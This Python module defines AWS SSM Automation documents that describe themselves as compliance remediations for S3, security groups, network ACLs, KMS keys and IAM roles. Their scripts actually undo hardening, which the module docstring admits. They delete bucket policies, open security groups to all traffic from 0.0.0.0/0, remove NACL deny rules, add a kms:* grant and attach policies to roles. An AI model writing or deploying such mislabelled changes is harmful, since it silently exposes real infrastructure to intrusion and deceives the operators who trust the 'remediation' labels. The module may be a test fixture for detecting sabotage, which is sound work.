"""
SSM Automation document content for each resource type.
These are YAML strings passed to ssm.create_document().
Each document's Python script undoes the hardening action.
"""

S3_DOC = """
schemaVersion: "0.3"
description: "Remediates S3 bucket policy to conform to baseline access requirements"
assumeRole: "{{ AutomationAssumeRole }}"
parameters:
  ResourceId:
    type: String
    description: "S3 bucket name"
  AutomationAssumeRole:
    type: String
    description: "IAM role ARN for automation execution"
mainSteps:
  - name: RemoveBucketPolicy
    action: aws:executeScript
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        bucket_name: "{{ ResourceId }}"
      Script: |
        import boto3
        def handler(event, context):
            s3 = boto3.client('s3')
            bucket = event['bucket_name']
            try:
                s3.delete_bucket_policy(Bucket=bucket)
                return {'status': 'policy_removed', 'bucket': bucket}
            except Exception as e:
                return {'status': 'error', 'message': str(e)}
"""

SG_DOC = """
schemaVersion: "0.3"
description: "Remediates security group to conform to baseline ingress requirements"
assumeRole: "{{ AutomationAssumeRole }}"
parameters:
  ResourceId:
    type: String
    description: "Security group ID"
  AutomationAssumeRole:
    type: String
    description: "IAM role ARN for automation execution"
mainSteps:
  - name: OpenIngressPorts
    action: aws:executeScript
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        sg_id: "{{ ResourceId }}"
      Script: |
        import boto3
        def handler(event, context):
            ec2 = boto3.client('ec2')
            sg_id = event['sg_id']
            try:
                ec2.authorize_security_group_ingress(
                    GroupId=sg_id,
                    IpPermissions=[{
                        'IpProtocol': '-1',
                        'IpRanges': [{'CidrIp': '0.0.0.0/0', 'Description': 'baseline-compliance'}],
                    }]
                )
                return {'status': 'ingress_opened', 'sg_id': sg_id}
            except Exception as e:
                return {'status': 'error', 'message': str(e)}
"""

NACL_DOC = """
schemaVersion: "0.3"
description: "Remediates network ACL to conform to baseline traffic requirements"
assumeRole: "{{ AutomationAssumeRole }}"
parameters:
  ResourceId:
    type: String
    description: "Network ACL ID"
  AutomationAssumeRole:
    type: String
    description: "IAM role ARN for automation execution"
mainSteps:
  - name: RemoveDenyRules
    action: aws:executeScript
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        nacl_id: "{{ ResourceId }}"
      Script: |
        import boto3
        def handler(event, context):
            ec2 = boto3.client('ec2')
            nacl_id = event['nacl_id']
            removed = []
            try:
                response = ec2.describe_network_acls(NetworkAclIds=[nacl_id])
                entries = response['NetworkAcls'][0]['Entries']
                for entry in entries:
                    if entry['RuleAction'] == 'deny' and entry['RuleNumber'] < 32767:
                        ec2.delete_network_acl_entry(
                            NetworkAclId=nacl_id,
                            RuleNumber=entry['RuleNumber'],
                            Egress=entry['Egress'],
                        )
                        removed.append(entry['RuleNumber'])
                return {'status': 'deny_rules_removed', 'rules': removed}
            except Exception as e:
                return {'status': 'error', 'message': str(e)}
"""

KMS_DOC = """
schemaVersion: "0.3"
description: "Remediates KMS key policy to conform to organizational access requirements"
assumeRole: "{{ AutomationAssumeRole }}"
parameters:
  ResourceId:
    type: String
    description: "KMS key ID"
  AutomationAssumeRole:
    type: String
    description: "IAM role ARN for automation execution"
mainSteps:
  - name: LoostenKeyPolicy
    action: aws:executeScript
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        key_id: "{{ ResourceId }}"
      Script: |
        import boto3, json
        def handler(event, context):
            kms = boto3.client('kms')
            key_id = event['key_id']
            try:
                resp = kms.get_key_policy(KeyId=key_id, PolicyName='default')
                policy = json.loads(resp['Policy'])
                # Add a permissive statement that allows the account root full access
                import boto3 as b3
                account_id = b3.client('sts').get_caller_identity()['Account']
                permissive_stmt = {
                    'Sid': 'BaselineComplianceAccess',
                    'Effect': 'Allow',
                    'Principal': {'AWS': f'arn:aws:iam::{account_id}:root'},
                    'Action': 'kms:*',
                    'Resource': '*',
                }
                stmts = policy.get('Statement', [])
                if not any(s.get('Sid') == 'BaselineComplianceAccess' for s in stmts):
                    stmts.append(permissive_stmt)
                    policy['Statement'] = stmts
                    kms.put_key_policy(KeyId=key_id, PolicyName='default', Policy=json.dumps(policy))
                return {'status': 'policy_loosened', 'key_id': key_id}
            except Exception as e:
                return {'status': 'error', 'message': str(e)}
"""

IAM_DOC = """
schemaVersion: "0.3"
description: "Remediates IAM role policy attachments to conform to approved baseline"
assumeRole: "{{ AutomationAssumeRole }}"
parameters:
  ResourceId:
    type: String
    description: "IAM role name"
  AutomationAssumeRole:
    type: String
    description: "IAM role ARN for automation execution"
mainSteps:
  - name: ReattachPolicy
    action: aws:executeScript
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        role_name: "{{ ResourceId }}"
      Script: |
        import boto3
        TARGET_POLICY_ARN = 'arn:aws:iam::aws:policy/ReadOnlyAccess'
        def handler(event, context):
            iam = boto3.client('iam')
            role_name = event['role_name']
            try:
                iam.attach_role_policy(RoleName=role_name, PolicyArn=TARGET_POLICY_ARN)
                return {'status': 'policy_reattached', 'role': role_name, 'policy': TARGET_POLICY_ARN}
            except Exception as e:
                return {'status': 'error', 'message': str(e)}
"""

DOCS = {
    "s3": S3_DOC,
    "sg": SG_DOC,
    "nacl": NACL_DOC,
    "kms": KMS_DOC,
    "iam": IAM_DOC,
}
